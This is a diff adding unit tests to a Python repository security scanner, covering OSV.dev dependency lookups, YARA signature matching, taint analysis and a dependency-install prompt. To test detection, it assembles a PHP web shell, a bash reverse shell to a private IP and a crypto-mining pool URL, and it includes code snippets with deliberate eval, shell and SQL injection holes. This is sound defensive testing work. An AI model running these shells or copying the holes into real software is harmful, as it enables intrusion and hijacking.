@@ -2898,6 +2898,311 @@ class TestCoverageGaps2(unittest.TestCase):
 
 
 # ============================================================================
+# OSV.dev fallback (Engine 1)
+# ============================================================================
+
+from unittest import mock
+import gatekeeper_scanner.osv as osv_mod
+
+
+class TestOSVFallback(unittest.TestCase):
+    """OSV.dev is the network fallback used when pip-audit / npm are absent.
+    All tests monkeypatch audit_packages so nothing touches the network."""
+
+    def _scan_with_osv(self, files, osv_return, no_osv=False):
+        d = create_test_repo(files)
+        try:
+            scanner = SecurityScanner(skip_deps=False, no_osv=no_osv)
+            # Force the binary-missing fallback path regardless of host tooling.
+            scanner._resolve_binary = lambda name: None
+            with mock.patch.object(osv_mod, "audit_packages", return_value=osv_return):
+                report = scanner.scan(d)
+            self._last_warnings = list(scanner.warnings)
+            return report
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_python_pinned_cve_becomes_finding(self):
+        osv_return = ([{"package": "requests", "version": "2.19.0",
+                        "id": "GHSA-xxxx", "cve": "CVE-2018-18074",
+                        "summary": "Credentials leak on redirect", "severity": "HIGH"}], None)
+        report = self._scan_with_osv({"requirements.txt": "requests==2.19.0\n"}, osv_return)
+        self.assertTrue(has_message_containing(report, "CVE-2018-18074"))
+        self.assertTrue(has_message_containing(report, "OSV.dev"))
+        self.assertTrue(has_category(report, "DEPENDENCY"))
+
+    def test_unpinned_package_not_queried(self):
+        # No '==' pin → nothing to send to OSV → no findings, audit_packages never matters.
+        report = self._scan_with_osv({"requirements.txt": "requests>=2.0\n"}, ([], None))
+        self.assertFalse(has_message_containing(report, "OSV.dev"))
+
+    def test_no_osv_flag_disables_network(self):
+        osv_return = ([{"package": "requests", "version": "2.19.0", "id": "X",
+                        "cve": "CVE-1", "summary": "x", "severity": "HIGH"}], None)
+        report = self._scan_with_osv({"requirements.txt": "requests==2.19.0\n"},
+                                     osv_return, no_osv=True)
+        self.assertFalse(has_message_containing(report, "OSV.dev"))
+
+    def test_network_failure_warns_no_findings(self):
+        report = self._scan_with_osv({"requirements.txt": "requests==2.19.0\n"},
+                                     ([], "OSV.dev lookup skipped — network error (offline)"))
+        self.assertFalse(has_message_containing(report, "OSV.dev"))
+        self.assertTrue(any("OSV.dev lookup skipped" in w for w in self._last_warnings))
+
+    def test_npm_lockfile_v3_parsed(self):
+        lock = json.dumps({"lockfileVersion": 3, "packages": {
+            "": {"name": "app"},
+            "node_modules/lodash": {"version": "4.17.4"},
+        }})
+        osv_return = ([{"package": "lodash", "version": "4.17.4", "id": "GHSA-y",
+                        "cve": "CVE-2019-10744", "summary": "Prototype pollution",
+                        "severity": "CRITICAL"}], None)
+        report = self._scan_with_osv(
+            {"package.json": '{"name":"app"}', "package-lock.json": lock}, osv_return)
+        self.assertTrue(has_message_containing(report, "CVE-2019-10744"))
+
+    def test_audit_packages_offline_safe(self):
+        # Real client against an unresolvable host returns ([], warning), never raises.
+        with mock.patch.object(osv_mod, "OSV_BATCH_URL",
+                               "http://gatekeeper.invalid.localhost:9/v1/querybatch"):
+            results, warning = osv_mod.audit_packages(
+                [{"name": "requests", "version": "2.19.0"}], "PyPI", timeout=2)
+        self.assertEqual(results, [])
+        self.assertIsNotNone(warning)
+
+    def test_audit_packages_empty_input(self):
+        results, warning = osv_mod.audit_packages([], "PyPI")
+        self.assertEqual(results, [])
+        self.assertIsNone(warning)
+
+
+# ============================================================================
+# YARA signature engine (Engine 2)
+# ============================================================================
+
+from gatekeeper_scanner import yara_engine as yara_mod
+
+# Payloads assembled at runtime so this test FILE never contains a contiguous
+# signature (mirrors the _FAKE_STRIPE split-string approach for secrets).
+_WEBSHELL = "<?php " + "eval($_" + "POST['c']); ?>"
+_REVSHELL = "bash " + "-i >& /dev/" + "tcp/10.0.0.1/4444 0>&1"
+_MINER = '"url": "stra' + 'tum+tcp://pool.minexmr.com:4444"'
+
+
+class TestYaraEngineUnit(unittest.TestCase):
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_rules_compile(self):
+        rules, err = yara_mod.compile_rules()
+        self.assertIsNone(err)
+        self.assertIsNotNone(rules)
+
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_webshell_and_clean(self):
+        rules, _ = yara_mod.compile_rules()
+        self.assertTrue(yara_mod.scan_bytes(rules, _WEBSHELL.encode()))
+        self.assertEqual(yara_mod.scan_bytes(rules, b"def add(a, b):\n    return a + b\n"), [])
+
+    def test_scan_bytes_handles_none_rules(self):
+        # When rules failed to compile, scan_bytes must no-op, never raise.
+        self.assertEqual(yara_mod.scan_bytes(None, _WEBSHELL.encode()), [])
+
+
+class TestYaraIntegration(unittest.TestCase):
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_planted_webshell_flagged(self):
+        report = scan_repo({"shell.php": _WEBSHELL})
+        sigs = [f for f in report.findings if f.category == "SIGNATURE"]
+        self.assertTrue(sigs, "webshell should produce a SIGNATURE finding")
+        self.assertEqual(sigs[0].severity, "CRITICAL")
+        self.assertEqual(sigs[0].cwe, "CWE-506")
+
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_reverse_shell_flagged(self):
+        report = scan_repo({"deploy.sh": "#!/bin/bash\n" + _REVSHELL + "\n"})
+        self.assertTrue(any(f.category == "SIGNATURE" for f in report.findings))
+
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_clean_repo_no_signature(self):
+        report = scan_repo({"app.py": "def add(a, b):\n    return a + b\n"})
+        self.assertFalse(any(f.category == "SIGNATURE" for f in report.findings))
+
+    @unittest.skipUnless(yara_mod.available(), "yara-python not installed")
+    def test_yara_rule_files_not_self_scanned(self):
+        # A repo shipping its own .yar rules must not be flagged for their content.
+        rule_text = 'rule x { strings: $a = "stra' + 'tum+tcp://" condition: $a }'
+        report = scan_repo({"rules/detect.yar": rule_text})
+        self.assertFalse(any(f.category == "SIGNATURE" for f in report.findings))
+
+    def test_graceful_skip_when_unavailable(self):
+        # Simulate yara-python missing: scan still completes and warns.
+        d = create_test_repo({"shell.php": _WEBSHELL})
+        try:
+            scanner = SecurityScanner(skip_deps=True)
+            with mock.patch.object(yara_mod, "available", return_value=False):
+                report = scanner.scan(d)
+            self.assertFalse(any(f.category == "SIGNATURE" for f in report.findings))
+            self.assertTrue(any("YARA signature scan skipped" in w for w in scanner.warnings))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+# ============================================================================
+# Intra-function taint analysis (Engine 3)
+# ============================================================================
+
+from gatekeeper_scanner import taint as taint_mod
+
+
+class TestTaintUnit(unittest.TestCase):
+    def _sev(self, src):
+        return [(f["severity"], f["message"]) for f in taint_mod.analyze("x.py", src)]
+
+    def test_flask_eval_critical(self):
+        src = ('from flask import request\n'
+               'def v():\n'
+               '    n = request.args["q"]\n'
+               '    return eval(n)\n')
+        out = self._sev(src)
+        self.assertTrue(out and out[0][0] == "CRITICAL")
+
+    def test_shell_true_critical(self):
+        src = ('def r():\n'
+               '    c = request.form["c"]\n'
+               '    subprocess.run(c, shell=True)\n')
+        self.assertTrue(any(s == "CRITICAL" for s, _ in self._sev(src)))
+
+    def test_sql_execute_high(self):
+        src = ('def q(cursor):\n'
+               '    uid = request.args.get("id")\n'
+               '    cursor.execute("SELECT * FROM u WHERE id=" + uid)\n')
+        self.assertTrue(any(s == "HIGH" for s, _ in self._sev(src)))
+
+    def test_decorated_handler_params_tainted(self):
+        src = ('@app.route("/x")\n'
+               'def h(user_id):\n'
+               '    eval(user_id)\n')
+        self.assertTrue(self._sev(src))
+
+    def test_sanitizer_clears_taint(self):
+        src = ('def s():\n'
+               '    eval(int(request.args["n"]))\n')
+        self.assertEqual(self._sev(src), [])
+
+    def test_clean_literal_no_finding(self):
+        src = ('def s():\n'
+               '    subprocess.run(["ls", "-la"])\n'
+               '    eval("1+1")\n')
+        self.assertEqual(self._sev(src), [])
+
+    def test_env_to_filepath_is_benign(self):
+        # Weak source (env var) must NOT trip the MEDIUM file-path sink.
+        src = ('import os\n'
+               'def s():\n'
+               '    d = os.environ.get("DIR", ".")\n'
+               '    open(d + "/f").read()\n')
+        self.assertEqual(self._sev(src), [])
+
+    def test_env_to_eval_is_flagged(self):
+        # Weak source DOES reach a high-impact code-exec sink.
+        src = ('import os\n'
+               'def s():\n'
+               '    c = os.getenv("CMD")\n'
+               '    eval(c)\n')
+        self.assertTrue(self._sev(src))
+
+    def test_syntax_error_returns_empty(self):
+        self.assertEqual(taint_mod.analyze("x.py", "def (:\n"), [])
+
+
+class TestTaintIntegration(unittest.TestCase):
+    def test_planted_taint_flagged(self):
+        report = scan_repo({"app.py":
+            'from flask import request\n'
+            'def v():\n'
+            '    cmd = request.args["c"]\n'
+            '    import os\n'
+            '    os.system(cmd)\n'})
+        taints = [f for f in report.findings if f.category == "TAINT"]
+        self.assertTrue(taints)
+        self.assertEqual(taints[0].cwe, "CWE-78")
+
+    def test_no_taint_flag_disables(self):
+        d = create_test_repo({"app.py":
+            'def v():\n    eval(request.args["x"])\n'})
+        try:
+            scanner = SecurityScanner(skip_deps=True, no_taint=True)
+            report = scanner.scan(d)
+            self.assertFalse(any(f.category == "TAINT" for f in report.findings))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+# ============================================================================
+# First-run optional-dependency prompt
+# ============================================================================
+
+import argparse
+import io
+import contextlib
+import gatekeeper_scanner.core as core_mod
+
+
+class TestOptionalDepsPrompt(unittest.TestCase):
+    FAKE_DEP = [{"pkg": "yara-python", "import": "yara", "reason": "signature scanning"}]
+
+    def _args(self, **kw):
+        base = dict(json=False, sarif=False, quiet=False)
+        base.update(kw)
+        return argparse.Namespace(**base)
+
+    def _run(self, args, tty=True, marker_home=None, answer="n"):
+        """Run the prompt with a forced-missing dep, capturing stdout.
+        buf.isatty is set explicitly because redirect_stdout makes sys.stdout
+        the buffer, and the function calls sys.stdout.isatty()."""
+        buf = io.StringIO()
+        buf.isatty = lambda: tty
+        with mock.patch.object(core_mod, "_missing_optional_deps", return_value=self.FAKE_DEP), \
+             mock.patch.dict(os.environ, {"HOME": marker_home} if marker_home else {}, clear=False), \
+             mock.patch("sys.stdin.isatty", return_value=tty), \
+             mock.patch("builtins.input", return_value=answer), \
+             contextlib.redirect_stdout(buf):
+            core_mod._prompt_optional_deps(args)
+        return buf.getvalue()
+
+    def test_silent_when_piped(self):
+        # Non-TTY (how the Claude skill and CI invoke it): no prompt, no hang.
+        out = self._run(self._args(), tty=False)
+        self.assertEqual(out, "")
+
+    def test_silent_in_json_mode(self):
+        out = self._run(self._args(json=True), tty=True)
+        self.assertEqual(out, "")
+
+    def test_single_dep_wording_and_decline(self):
+        d = tempfile.mkdtemp()
+        try:
+            out = self._run(self._args(), tty=True, marker_home=d, answer="n")
+            self.assertIn("one optional add-on", out)
+            self.assertIn("yara-python", out)
+            self.assertIn("Skipped", out)
+            # Marker written so it won't ask again.
+            self.assertTrue(os.path.exists(os.path.join(d, ".gatekeeper", "deps-prompted.json")))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_does_not_reprompt_after_marker(self):
+        d = tempfile.mkdtemp()
+        try:
+            os.makedirs(os.path.join(d, ".gatekeeper"), exist_ok=True)
+            with open(os.path.join(d, ".gatekeeper", "deps-prompted.json"), "w") as f:
+                json.dump(["yara-python"], f)
+            out = self._run(self._args(), tty=True, marker_home=d, answer="y")
+            self.assertEqual(out, "")  # already prompted → silent
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+# ============================================================================
 # Run
 # ============================================================================
 
